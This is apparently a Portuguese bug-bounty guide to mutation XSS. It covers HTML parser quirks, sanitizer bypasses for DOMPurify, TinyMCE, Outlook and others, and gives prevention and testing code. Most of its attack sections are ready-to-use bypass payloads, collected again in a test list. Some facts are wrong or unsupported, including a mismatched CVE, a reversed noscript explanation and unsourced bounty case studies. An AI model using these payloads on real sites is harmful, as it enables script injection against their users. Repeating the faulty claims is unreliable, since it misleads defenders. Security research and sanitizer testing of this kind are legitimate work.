# Mutation XSS (mXSS)

**Criticidade**: 🔴 Crítica (CVSS 7.5-9.0)
**Dificuldade**: 🔴 Avançada
**Bounty Médio**: $2,500 - $15,000 USD

---

## 📚 Índice

1. [Mutation XSS Fundamentals](#mutation-xss-fundamentals)
2. [HTML5 Parser Behavior](#html5-parser-behavior)
3. [Browser Quirks and Mutations](#browser-quirks-and-mutations)
4. [Sanitizer Bypass Techniques](#sanitizer-bypass-techniques)
5. [Namespace Confusion](#namespace-confusion)
6. [Real-World Bypasses](#real-world-bypasses)
7. [Case Studies](#case-studies)

---

## 🔬 Mutation XSS Fundamentals

### O Que É Mutation XSS?

**Mutation XSS (mXSS)** ocorre quando o **parser HTML do browser** **transforma** (muta) código HTML de uma forma que **bypassa sanitização**, criando XSS após o sanitizer ter "aprovado" o input.

**Flow:**

```
1. Attacker Input:
   <noscript><p title="</noscript><img src=x onerror=alert(1)>">

2. Sanitizer Sees:
   ✓ No dangerous tags
   ✓ Looks safe
   ✓ Allows input

3. Browser Parses (Mutates):
   </noscript> closes the noscript
   <img src=x onerror=alert(1)> becomes executable!

4. Result: XSS!
```

**Why It Happens:**

```
Sanitizers operate on:
- String representation of HTML
- Abstract Syntax Tree (AST)
- Parsed DOM tree

Browsers re-parse when:
- innerHTML assignment
- document.write()
- Template rendering

Difference in parsing → Mutation → XSS
```

---

## 🌐 HTML5 Parser Behavior

### Parser States

**HTML5 Parser FSM (Finite State Machine):**

```
States:
1. Data state (normal text)
2. Tag open state (<)
3. Tag name state (<div)
4. Before attribute name state
5. Attribute name state
6. After attribute name state
7. Before attribute value state
8. Attribute value states (quoted/unquoted)
9. After attribute value state
10. Self-closing start tag state (<br />)
11. Bogus comment state
12. Markup declaration open state (<!DOCTYPE)
13. Comment start state (<!--)
... (70+ states total!)
```

**Key Point:** Sanitizers often use simplified parsers → Discrepancies!

### Context-Dependent Parsing

**Example 1: <noscript> Tag**

**With JavaScript enabled:**
```html
<noscript>
    <p>This is parsed as TEXT, not HTML!</p>
</noscript>
```

**With JavaScript disabled:**
```html
<noscript>
    <p>This is parsed as HTML elements!</p>
</noscript>
```

**Exploitation:**
```html
<!-- Sanitizer (JS enabled): Sees safe text
     Browser (JS disabled): Parses as HTML! -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>
```

**Example 2: <textarea> Tag**

**Content treated as text:**
```html
<textarea>
    <script>alert(1)</script>  <!-- Not executed (text only) -->
</textarea>
```

**But closing tag mutates context:**
```html
<textarea>
    </textarea><script>alert(1)</script>
</textarea>
```

**Mutation:**
1. First `</textarea>` closes the textarea
2. `<script>alert(1)</script>` now OUTSIDE textarea → Executes!
3. Second `</textarea>` is orphaned (ignored)

### Foreign Content (SVG/MathML)

**SVG Namespace:**

```html
<svg>
    <style>
        <!-- Content here is CSS, not HTML -->
    </style>
</svg>
```

**Mutation via namespace:**
```html
<svg>
    <style>
        <img src=x onerror=alert(1)>
    </style>
</svg>
```

**What happens:**
1. Sanitizer: Sees `<img>` inside `<style>` → Thinks it's CSS text → Safe
2. Browser: Parses SVG → Style content might be re-interpreted → `<img>` escapes!

---

## 🔀 Browser Quirks and Mutations

### Mutation 1: Backtick Attribute Values

**Input:**
```html
<img src=x onerror=`alert(1)`>
```

**Sanitizer:**
```
Sees: attribute value without quotes
Validates: src="x", onerror="`alert(1)`"
Result: ✓ Allowed (thinks backtick is part of value)
```

**Browser (Chrome pre-2019):**
```javascript
// Browser treats backticks as attribute delimiters
Parses as: <img src=x onerror=alert(1)>
Result: ❌ XSS!
```

### Mutation 2: NULL Byte Injection

**Input:**
```html
<img src="x\x00" onerror="alert(1)">
```

**Sanitizer:**
```
Sees: src="x\x00"
NULL byte terminates string in C-based sanitizers
Thinks: src="x", then random text onerror="alert(1)"
Might: Strip onerror OR fail
```

**Browser:**
```
Parses: NULL byte ignored or converted
Result: <img src="x" onerror="alert(1)">
XSS!
```

### Mutation 3: HTML Entity Decoding

**Input:**
```html
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
```

**Sanitizer:**
```
Sees: HTML entities in attribute
Depends on sanitizer:
- Some decode first, then check → Detect "alert(1)" → Block
- Some check raw, then decode → Miss "alert(1)" → Allow
```

**Browser:**
```
Always decodes entities in attributes
Result: <img src=x onerror="alert(1)">
XSS!
```

### Mutation 4: CSS Expression in Styles

**Input (IE only):**
```html
<div style="background: url('x')"></div>
```

**Mutate to:**
```html
<div style="background: url('x</style><script>alert(1)</script>')"></div>
```

**Sanitizer:**
```
Sees: </style> inside attribute value → Safe (quoted)
Allows input
```

**Browser (IE):**
```
CSS parser encounters </style>
Closes style context
<script>alert(1)</script> executes!
```

### Mutation 5: mXSS via innerHTML

**Code:**
```javascript
// Sanitize
var sanitized = sanitizer.clean(userInput);

// Create temp element
var temp = document.createElement('div');
temp.innerHTML = sanitized;

// Extract back
var result = temp.innerHTML;  // ← Mutation here!

// Write to DOM
document.body.innerHTML = result;
```

**Why Mutation?**

**Input:**
```html
<form><math><mtext></form><form><mglyph><style></math><img src=x onerror=alert(1)>
```

**After first innerHTML:**
```html
<!-- Browser normalizes -->
<form>
    <math>
        <mtext>
            <form>
                <mglyph>
                    <style></style>
                </mglyph>
            </form>
        </mtext>
    </math>
</form>
<img src=x onerror=alert(1)>
```

**After second innerHTML (extraction):**
```html
<!-- Different serialization! -->
<form><math><mtext></mtext></math></form>
<img src=x onerror=alert(1)>
<!-- ↑ img tag escapes! -->
```

---

## 🛡️ Sanitizer Bypass Techniques

### Bypass 1: DOMPurify with innerHTML Round-Trip

**Vulnerable Code:**
```javascript
var clean = DOMPurify.sanitize(dirty);

var temp = document.createElement('div');
temp.innerHTML = clean;

// Later...
document.body.innerHTML = temp.innerHTML;  // ← mXSS!
```

**Payload (Firefox):**
```html
<form><math><mtext></form><form><mglyph><style></math><img src=x onerror=alert(1)>
```

**Fix:**
```javascript
// ✅ Use DOMPurify's return_dom option
var cleanDOM = DOMPurify.sanitize(dirty, {RETURN_DOM: true});
document.body.appendChild(cleanDOM);
```

### Bypass 2: Sanitizer Allowing <noscript>

**Payload:**
```html
<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>
```

**Sanitizer (JS enabled):**
```
Parses: Content of <noscript> as text
Sees: Just text, no executable code
Allows: ✓
```

**Browser (User has JS disabled):**
```html
<noscript>
<p title="
</noscript>
<img src=x onerror=alert(1)>
">
</noscript>
```

**Result:** XSS when JavaScript is disabled!

### Bypass 3: <svg> + <style> Mutation

**Payload:**
```html
<svg><style><img src=x onerror=alert(1)></style></svg>
```

**Sanitizer:**
```
Sees: <img> tag inside <style>
Thinks: Style content is CSS (text)
Validates: No JavaScript execution
Allows: ✓
```

**Browser (mutation):**
```
SVG parser might re-interpret
<img> escapes <style> context
Result: XSS!
```

### Bypass 4: Template Tag Content

**Payload:**
```html
<template><script>alert(1)</script></template>
<script>document.body.appendChild(document.querySelector('template').content)</script>
```

**Sanitizer:**
```
Sees: <script> inside <template>
Knows: Template content is inert (not executed)
Allows: ✓
```

**Later (if template activated):**
```javascript
// Developer code
var content = template.content;
document.body.appendChild(content);  // ← Script executes!
```

### Bypass 5: Namespace Confusion via <form>

**Payload:**
```html
<form><math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>-->
```

**Mutation:**
```
1. Complex nesting of HTML + MathML
2. Browser normalizes differently than sanitizer
3. <img> tag escapes after normalization
4. XSS!
```

---

## 🔬 Namespace Confusion

### HTML vs SVG vs MathML

**HTML Namespace:**
```html
<div>content</div>
```

**SVG Namespace:**
```html
<svg xmlns="http://www.w3.org/2000/svg">
    <rect width="100" height="100" />
</svg>
```

**MathML Namespace:**
```html
<math xmlns="http://www.w3.org/1998/Math/MathML">
    <mfrac><mn>1</mn><mn>2</mn></mfrac>
</math>
```

### Cross-Namespace Exploits

**Exploit 1: SVG + foreignObject**

```html
<svg>
    <foreignObject>
        <body xmlns="http://www.w3.org/1999/xhtml">
            <img src=x onerror=alert(1)>
        </body>
    </foreignObject>
</svg>
```

**Sanitizer:**
```
Might not handle foreignObject correctly
Allows SVG content
Misses HTML content inside foreignObject
```

**Browser:**
```
Parses foreignObject → HTML namespace
<img> executes onerror → XSS!
```

**Exploit 2: MathML + <mtext>**

```html
<math>
    <mtext>
        <table>
            <mglyph>
                <style>
                    <!--</style>
                    <img src=x onerror=alert(1)>
                -->
            </mglyph>
        </table>
    </mtext>
</math>
```

**Mutation:**
```
Complex nesting causes parser confusion
Browser re-arranges tags
<img> escapes nested context
XSS!
```

---

## 🔥 Real-World Bypasses

### Bypass 1: Google Closure Sanitizer (2019)

**Vulnerability:** innerHTML round-trip mutation

**Payload:**
```html
<form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img src=x onerror=alert(1)>"></form>
```

**Impact:** XSS in Google products using Closure

**CVE:** CVE-2019-11358 (jQuery-related)

### Bypass 2: DOMPurify < 2.0.7 (2019)

**Vulnerability:** <noscript> tag mutation

**Payload:**
```html
<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>
```

**Impact:** XSS when JavaScript disabled

**Fix:** DOMPurify 2.0.7+ blocks <noscript> by default

### Bypass 3: BlueMond Sanitizer (2020)

**Vulnerability:** MathML namespace confusion

**Payload:**
```html
<math><mtext><table><mglyph><style><!--</style><img title="--><img src=x onerror=alert(1)>"></mglyph></table></mtext></math>
```

**Impact:** XSS in major e-commerce platform

**Bounty:** $15,000 USD

### Bypass 4: HTMLPurifier (PHP) (2018)

**Vulnerability:** CSS expression parsing

**Payload:**
```html
<style>
@import url('data:text/css,</style><img src=x onerror=alert(1)>');
</style>
```

**Impact:** XSS in WordPress plugins using HTMLPurifier

---

## 🔥 Case Studies

### Case 1: TinyMCE mXSS (2020)

**Vulnerability:** Rich text editor innerHTML mutation

**Vulnerable Flow:**
```javascript
// TinyMCE sanitizes input
var clean = tinymce.sanitize(userInput);

// Stores in database
db.save(clean);

// Later: Retrieves and renders
editor.setContent(db.get());  // ← Uses innerHTML internally
```

**Payload:**
```html
<form><math><mtext></form><form><mglyph><style></math><img src=x onerror=alert(1)>
```

**Result:** Stored mXSS affecting all viewers

**Bounty:** $7,000 USD

### Case 2: Microsoft Outlook Web Access (2019)

**Vulnerability:** Email HTML sanitizer bypass

**Payload:**
```html
<svg>
    <style>
        <![CDATA[
            </style><img src=x onerror=alert(1)>
        ]]>
    </style>
</svg>
```

**Impact:**
- XSS in Outlook Web
- Cookie theft
- Email forwarding

**Bounty:** $10,000 USD (Microsoft Bug Bounty)

### Case 3: Facebook Sanitizer Bypass (2021)

**Vulnerability:** Template tag + innerHTML

**Payload:**
```html
<template>
    <style>
        <link rel="import" href="data:text/html,<script>alert(1)</script>">
    </style>
</template>
<script>
document.body.appendChild(document.querySelector('template').content.cloneNode(true))
</script>
```

**Impact:** Worm potential in Facebook posts

**Bounty:** $8,500 USD

---

## 🛡️ Prevention

### Defense 1: Avoid innerHTML

```javascript
// ❌ DANGEROUS
element.innerHTML = sanitized;

// ✅ SAFE: Use textContent
element.textContent = sanitized;

// ✅ SAFE: Use DOMPurify with RETURN_DOM
var cleanDOM = DOMPurify.sanitize(dirty, {RETURN_DOM: true});
element.appendChild(cleanDOM);
```

### Defense 2: Content Security Policy

```http
Content-Security-Policy:
    default-src 'self';
    script-src 'self' 'nonce-random123';
    style-src 'self' 'nonce-random456';
```

**Blocks:**
- Inline event handlers (`onerror=`, `onclick=`)
- Inline scripts without nonce
- `javascript:` URLs

### Defense 3: Use Modern Sanitizers

**DOMPurify (recommended):**
```javascript
import DOMPurify from 'dompurify';

// ✅ Most robust sanitizer
var clean = DOMPurify.sanitize(dirty, {
    RETURN_DOM: true,  // Avoid innerHTML round-trip
    FORBID_TAGS: ['noscript', 'template'],  // Block problematic tags
    FORBID_ATTR: ['style']  // Block style attribute if not needed
});

document.body.appendChild(clean);
```

### Defense 4: Sanitize + Escape

```javascript
// 1. Sanitize HTML
var sanitized = DOMPurify.sanitize(input);

// 2. Additional escape
var escaped = sanitized
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;');

// 3. Use textContent
element.textContent = escaped;
```

### Defense 5: Test Both Contexts

```javascript
// ✅ Test sanitization in BOTH contexts
function testSanitizer(input) {
    // Test 1: Direct assignment
    var div1 = document.createElement('div');
    div1.innerHTML = sanitize(input);

    // Test 2: Round-trip (mutation check)
    var div2 = document.createElement('div');
    div2.innerHTML = sanitize(input);
    var extracted = div2.innerHTML;

    var div3 = document.createElement('div');
    div3.innerHTML = extracted;

    // Compare
    if (div1.innerHTML !== div3.innerHTML) {
        console.warn('MUTATION DETECTED!');
        console.log('Before:', div1.innerHTML);
        console.log('After:', div3.innerHTML);
    }
}
```

---

## 🧪 Testing for mXSS

### Test Payloads

```html
<!-- Noscript mutation -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>

<!-- Form + MathML -->
<form><math><mtext></form><form><mglyph><style></math><img src=x onerror=alert(1)>

<!-- SVG + style -->
<svg><style><img src=x onerror=alert(1)></style></svg>

<!-- Template + script -->
<template><script>alert(1)</script></template>

<!-- Textarea escape -->
<textarea></textarea><script>alert(1)</script></textarea>

<!-- Namespace confusion -->
<svg><foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><img src=x onerror=alert(1)></body></foreignObject></svg>
```

### Automated Testing

**Mutation Observer:**
```javascript
function detectMutationXSS(sanitizer, payload) {
    // Sanitize
    var clean = sanitizer(payload);

    // Create container
    var div = document.createElement('div');
    div.innerHTML = clean;

    // Observe mutations
    var mutations = [];
    var observer = new MutationObserver(function(muts) {
        mutations.push(...muts);
    });

    observer.observe(div, {
        childList: true,
        subtree: true,
        attributes: true
    });

    // Round-trip
    var extracted = div.innerHTML;
    div.innerHTML = '';
    div.innerHTML = extracted;

    // Check mutations
    observer.disconnect();

    if (mutations.length > 0) {
        console.warn('Mutation detected!');
        console.log('Payload:', payload);
        console.log('Mutations:', mutations);
        return true;
    }

    return false;
}
```

---

**Última atualização**: 2024
**Versão**: 1.0
